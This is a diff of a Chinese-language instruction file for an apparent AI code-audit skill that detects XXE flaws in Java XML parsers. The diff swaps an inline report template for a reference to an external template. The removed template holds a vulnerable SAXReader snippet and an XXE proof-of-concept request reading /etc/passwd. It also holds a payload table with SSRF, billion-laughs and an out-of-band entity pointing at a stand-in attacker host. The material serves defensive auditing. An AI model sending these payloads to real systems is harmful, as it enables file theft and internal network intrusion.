@@ -393,138 +393,12 @@ Skill(
 
 ## 输出格式
 
-### 综合报告模板（{project_name}_xxe_audit_{timestamp}.md）
+**严格按照 [references/OUTPUT_TEMPLATE.md](references/OUTPUT_TEMPLATE.md) 中的填充式模板生成输出文件。**
 
-```markdown
-# {项目名称} - XXE 漏洞审计报告
-
-生成时间: {timestamp}
-检测路径: {project_path}
-
----
-
-## 1. 审计概述
-
-| 项目 | 信息 |
-|------|------|
-| 审计范围 | {project_path} |
-| XML 解析器 | {XMLReader/SAXBuilder/SAXReader/SAXParserFactory/DocumentBuilderFactory} |
-| 检测方法 | 静态代码审计 + 数据流检查 |
-
----
-
-## 2. 漏洞统计
-
-| 严重等级 | CVSS | 数量 | 说明 |
-|----------|------|------|------|
-| 🔴 C (Critical) | 9.0-10.0 | {count} | 可直接导致系统沦陷 |
-| 🟠 H (High) | 7.0-8.9 | {count} | 可造成重大损害 |
-| 🟡 M (Medium) | 4.0-6.9 | {count} | 可造成一定损害 |
-| 🔵 L (Low) | 0.1-3.9 | {count} | 安全加固项 |
-
----
-
-## 3. XML 解析器映射表
-
-| 序号 | 类名 | 方法 | 解析器类型 | 输入来源 | 安全配置 | 可利用性 |
-|------|------|------|-----------|----------|----------|----------|
-| 1 | XmlParser | parse | SAXReader | getInputStream() | ❌ 未配置 | ✅ 可利用 |
-| 2 | ConfigLoader | loadConfig | DocumentBuilderFactory | 文件系统 | ✅ 已防护 | - |
-
----
-
-## 4. 高危漏洞详情
-
-### [{C/H/M/L}-XXE-{序号}] {漏洞标题}
-
-| 项目 | 信息 |
-|------|------|
-| 严重等级 | {🔴/🟠/🟡/🔵} {Critical/High/Medium/Low} (CVSS {score}) |
-| 可达性 (R) | {0-3} - {判定理由} |
-| 影响范围 (I) | {0-3} - {判定理由} |
-| 利用复杂度 (C) | {0-3} - {判定理由} |
-| 可利用性 | ✅ 已确认 / ⚠️ 待验证 / 🔍 Blind XXE |
-| 位置 | {ClassName.method} ({file}:{line}) |
-| 解析器 | {XMLReader/SAXBuilder/SAXReader/SAXParserFactory/DocumentBuilderFactory} |
-| 输入来源 | {request.getInputStream() / getParameter / ...} |
-| 回显方式 | {HTTP 响应 / 页面模型 / 无回显} |
-
-#### 漏洞代码
-
-\```java
-// 危险代码片段
-SAXReader reader = new SAXReader();
-Document doc = reader.read(request.getInputStream());
-Element root = doc.getRootElement();
-response.getWriter().write(root.element("user").getText());
-\```
-
-#### 数据流追踪
-
-\```
-用户输入: POST /api/xml/parse (Content-Type: application/xml)
-     ↓
-输入获取: request.getInputStream()
-     ↓
-XML 解析: SAXReader.read(inputStream)  ← 未设置安全特性
-     ↓
-数据提取: root.element("user").getText()
-     ↓
-回显输出: response.getWriter().write()  ← 回显到 HTTP 响应
-\```
-
-#### 验证 PoC
-
-\```http
-POST /api/xml/parse HTTP/1.1
-Host: {{host}}
-Content-Type: application/xml
-
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root>
-  <user>&xxe;</user>
-</root>
-\```
-
-#### 修复方案
-
-\```java
-SAXReader reader = new SAXReader();
-reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
-reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
-Document doc = reader.read(request.getInputStream());
-\```
-
----
-
-## 5. 验证 Payload 参考
-
-| 利用类型 | 测试 Payload | 预期结果 |
-|----------|--------------|----------|
-| 文件读取 | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 返回文件内容 |
-| SSRF | `<!ENTITY xxe SYSTEM "http://internal:8080">` | 触发内网请求 |
-| Blind XXE (OOB) | `<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">` | 外带数据到攻击者服务器 |
-| DoS (Billion Laughs) | 嵌套实体递归 | 服务器内存耗尽 |
-| 目录列表 (Java) | `<!ENTITY xxe SYSTEM "file:///path/">` | Java 环境可列目录 |
-
----
-
-## 6. 审计结论
-
-| 统计项 | 数量 |
-|--------|------|
-| 总 XML 解析点 | {count} |
-| 🔴 Critical | {count} |
-| 🟠 High | {count} |
-| 🟡 Medium | {count} |
-| 🔵 Low | {count} |
-| 安全（已防护） | {count} |
-```
+- 文件名格式: `{project_name}_xxe_audit_{YYYYMMDD_HHMMSS}.md`
+- 不得修改模板结构、不得增删章节、不得调整顺序
+- 所有【填写】占位符必须替换为实际内容
+- 通用规范参考: [shared/OUTPUT_STANDARD.md](../shared/OUTPUT_STANDARD.md)
 
 ---
 
@@ -548,11 +422,12 @@ Document doc = reader.read(request.getInputStream());
 - [ ] 区分了有回显 XXE 和 Blind XXE
 
 ### 报告完整性检查
-- [ ] **综合审计报告已生成**
+- [ ] **综合审计报告已生成，且通过 OUTPUT_TEMPLATE.md 末尾的自检清单**
 
 ---
 
 ## 参考资料
 
+- [OUTPUT_TEMPLATE.md](references/OUTPUT_TEMPLATE.md) - 输出报告填充式模板
 - [PARSERS.md](references/PARSERS.md) - 五种 XML 解析器详细检测规则
 - [DECOMPILE_STRATEGY.md](references/DECOMPILE_STRATEGY.md) - 反编译策略指南
